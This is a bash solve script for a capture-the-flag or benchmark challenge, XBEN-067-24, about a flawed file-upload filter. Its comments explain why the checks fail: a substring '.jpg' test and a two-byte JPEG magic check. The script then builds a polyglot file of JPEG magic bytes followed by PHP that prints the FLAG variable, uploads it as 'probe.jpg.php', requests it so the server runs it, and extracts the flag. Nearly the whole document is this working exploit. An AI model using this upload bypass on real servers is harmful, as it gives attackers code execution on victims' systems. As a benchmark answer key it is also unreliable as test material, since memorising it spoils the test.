#!/usr/bin/env bash
# XBEN-067-24 — "Medium file Upload" (tags: arbitrary_file_upload)
#
# The hardened sibling of XBEN-041. `security.php` adds two checks, and both are
# written the way that does not hold:
#
#   * the extension check is `strpos($name, '.jpg') !== false`, which asks
#     whether `.jpg` appears *anywhere* in the name, so `shell.jpg.php` passes it
#     and is still handed to PHP by Apache;
#   * the content check reads the first two bytes and wants `ff d8`, the JPEG
#     signature, which says nothing about the rest of the file.
#
# So the payload is a file that is both: two magic bytes, then PHP.
#
# That file cannot be written on a command line — `ff d8` is not text in any
# encoding — which is what `--set-file` is for.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben067-$$"
NAME="probe$$.jpg.php"
PAYLOAD="$(mktemp)"
trap 'rm -f "$PAYLOAD"; "$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

printf '\377\330<?php echo getenv("FLAG"); ?>' > "$PAYLOAD"

"$H5I" browser open "$URL/index.php" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/index.php' \
    --set "multipart.userfile.filename=$NAME" \
    --set 'multipart.userfile.content_type=image/jpeg' \
    --set-file "multipart.userfile=$PAYLOAD" \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set "path=/upload/$NAME" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
